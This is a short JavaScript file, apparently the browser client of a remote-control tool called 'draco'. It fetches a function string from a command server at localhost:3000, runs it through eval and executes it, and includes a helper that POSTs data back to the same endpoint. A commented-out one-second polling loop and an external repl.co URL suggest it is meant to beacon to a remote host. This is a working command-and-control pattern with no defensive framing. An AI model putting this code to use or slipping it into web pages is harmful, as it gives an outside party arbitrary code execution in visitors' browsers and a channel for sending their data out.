// Some useless comment
localStorage.setItem("draco_function_index", 0);

const sendData = async (data) => {
    console.log("happened")
    await fetch(`http://localhost:3000/command`, {
        method: 'POST', // or 'PUT'
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ data: data }),
    })
}


const getCommand = async () => {
    await fetch('http://localhost:3000/command', {
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        },
    })
        .then(res => res.json())
        .then(data => {
            const func = eval(data.function);
            func()

            // const idx = parseInt(data.index)
            // if (idx === parseInt(localStorage.getItem("draco_function_index"))) {
            //     return
            // }
            // else {
            //     localStorage.setItem("draco_function_index", idx);

            //     if (idx === parseInt(localStorage.getItem("draco_function_index"))) {
            //         return
            //     }
            //     // location.reload()
            // }
        })
        .catch(err => console.log(err))
}


// setInterval(getCommand, 1000)
getCommand()


// https://draco.maalolan.repl.co/command